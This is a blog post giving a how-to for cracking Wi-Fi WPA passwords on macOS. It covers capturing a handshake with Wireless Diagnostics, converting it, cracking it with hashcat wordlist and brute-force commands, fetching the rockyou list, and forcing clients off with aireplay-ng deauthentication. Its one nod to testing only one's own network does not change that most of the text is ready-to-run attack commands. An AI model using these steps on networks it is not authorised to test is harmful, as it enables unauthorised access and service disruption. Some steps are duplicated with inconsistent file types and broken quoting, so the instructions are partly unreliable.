---
title: WiFi Cracker in Mac OS X
date: 2020-01-12 23:04:34
categories: [Basic, Security, Tools]
tags:
---

Mac OS X comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click "Open Wireless Diagnostics..." and then click on Window > Scan. Find the target network, note its channel and width.

<!--more-->

# Capture a 4-way Handshake
With Wireless Diagnostics open, click on Window > Sniffer. Select the channel and width that you found in the previous step.
Now you'll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.
Once you think you've got a handshake, click Stop.
The .wcap capture file will either be saved to your Desktop or /var/tmp/ depending on your operating system version.
Convert the capture file to .hccapx by uploading it to https://hashcat.net/cap2hccapx/. If you captured any handshakes, the site will start downloading a .hccapx file. No download will be prompted if you did not.

* With Wireless Diagnostics open, click on Window > Sniffer. Select the channel and width that you found in the previous step.
* Now you'll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.
* Once you think you've got a handshake, click Stop.
The .pcap capture file will either be saved to your Desktop or /var/tmp/ depending on your operating system version.
* Convert the capture file to .hccapx by using https://github.com/hashcat/hashcat-utils in src folder compile to bin.
  
`gcc -o cap2hccapx cap2hccapx.c" and then run it: "./cap2hccapx"`

# Crack the password with hashcat

```
brew install hashcat
hashcat -m 2500 capture.hccapx wordlist.txt
# or brute force
hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
```

# Wordlist - Download the 134MB rockyou dictionary file

```
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

```
Other bigger candidates: 
* https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length
* https://xa.to/10m

# Deauth Attack

## Get deauth Tool
```
brew install aircrack-ng
```
Find `aireplay-ng` in sbin.

```
# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```
You can optionally broadcast deauth packets to all connected clients with:
```
# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
```


reference:

https://github.com/brannondorsey/wifi-cracking
https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html